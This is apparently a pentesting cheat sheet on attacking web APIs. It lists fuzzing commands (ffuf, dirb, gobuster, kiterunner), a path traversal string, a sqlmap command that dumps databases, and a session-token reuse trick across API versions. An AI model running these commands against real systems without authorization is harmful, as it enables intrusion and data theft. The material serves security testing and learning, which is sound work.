---
title: API Pentesting
description: Application Programming Interface (API) is for communicating with each computer. There are several types such as Web API, REST API, RESTful API.
tags:
    - Web
refs:
date: 2022-12-25
draft: false
---

## Change Methods

```sh
# Methods
GET, POST, PUT, DELETE, PATCH, INVENTED
```

<br />

## Endpoint Discovery

- **Manual Discovery**

    ```sh
    # Web Service Description Language
    /api/?wsdl

    # Versions
    /api/v1/user
    /api/v2/user

    # Wildcards
    /api/v2/user/posts/*
    /api/v2/users/*

    # Path traversal
    /api/v1/post/..\private
    ```

- **Automation**

    ```sh
    # Dirb
    dirb https://vulnerable.com/ endpoints.txt

    # Ffuf
    ffuf -u https://vulnerable.com/FUZZ -w endpoints.txt
    ffuf -u https://vulnerable.com/api/FUZZ -w wordlist.txt
    ffuf -u https://vulnerable.com/FUZZ -X POST -w endpoints.txt


    # Gobuster
    gobuster dir -u https://vulnerable.com/ -w endpoints.txt

    # Kiterunner
    # -A: wordlist type (ex. first 20000 words)
    # -x: max connection per host (default: 3)
    kr scan https://vulnerable.com/api -A=apiroutes-210228:20000 -x 10
    kr scan https://vulnerable.com/api -A=apiroutes-210228:20000 -x 10 --fail-status-codes 401,404
    kr scan https://vulnerable.com:8443/api -A=apiroutes-210228:20000 -x 10
    ```

    [This wordlist of endpoints](https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d){:target="_blank"} is useful.

<br />

## GET Parameters

```sh
/api/v1/user?id=test
/api/v1/user?name=test
/api/v1/user?uuid=test
/api/v1/status?live=test
/api/v1/status?verbose=test
```

<br />

## SQL Injection

```sh
sqlmap -u http://vulnerable.com/api/v2/fetch/?post=1 --dump --batch
```

<br />

## Same Session Across Multiple Versions and Instances

For example, assumed the website has two endpoints such as "/api/v1/user/login", "/api/v2/user/login".  
"v1" uses "X-Token" and "v2" uses "X-Session".  
After login to "v1", you may be able to get access "v2" using the session key/value of "v1".

```sh
X-Token: fc38ab5f5ae41072778d852023f9ee26
X-Session: fc38ab5f5ae41072778d852023f9ee26
```
